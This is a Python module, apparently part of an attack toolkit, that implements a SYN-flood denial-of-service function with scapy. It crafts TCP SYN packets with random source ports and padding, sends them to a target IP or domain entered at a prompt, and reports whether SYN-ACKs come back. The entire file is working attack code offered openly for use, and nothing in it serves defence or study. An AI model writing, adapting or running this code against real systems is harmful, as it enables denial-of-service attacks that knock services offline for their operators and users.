"""This module provides the flood function for a SYN-FLOOD attack."""

import socket
from random import randint

from colorama import Fore as F
from scapy.all import Raw, sr1
from scapy.layers.inet import IP, TCP

from tools.addons.ip_tools import get_target_domain


def flood(target: str) -> None:
    """Send a SYN packet to the target to perform a SYN flood attack.

    This method sends SYN packets to the target, which can be used to
    initiate a SYN flood attack. The target will receive a high volume of
    SYN requests, potentially leading to denial of service.

    Args:
        - target (str): The IP address or domain of the target to flood

    Returns:
        None
    """
    domain, port = get_target_domain(target)
    ip_addr = socket.gethostbyname(domain)
    
    try:
        # Create IP and TCP layers for the packet
        ip_layer = IP(dst=ip_addr)
        sport = randint(1024, 65535)  # Random source port
        tcp_layer = TCP(sport=sport, dport=port, flags="S")
        data = Raw(b"X" * 1024)
        
        # Construct the packet
        packet = ip_layer / tcp_layer / data
        
        # Send the packet and capture the response
        ans = sr1(packet, verbose=0)
        
        # Check the response to see if the SYN was acknowledged
        if ans and ans.haslayer(TCP) and ans[TCP].flags & 0x12:
            print(f"--> Socket on Port {F.BLUE}{sport:<5}{F.RESET} sent a SYN packet")
        else:
            print(f"--> Socket on Port {F.BLUE}{sport:<5}{F.RESET} sent a SYN packet, but no SYN-ACK received")
    except Exception as e:
        print(f"{F.RED}[!] {F.CYAN}An error occurred during the SYN flood attack: {e}{F.RESET}")


if __name__ == "__main__":
    target_ip = input("Enter target IP address or domain: ")
    flood(target_ip)
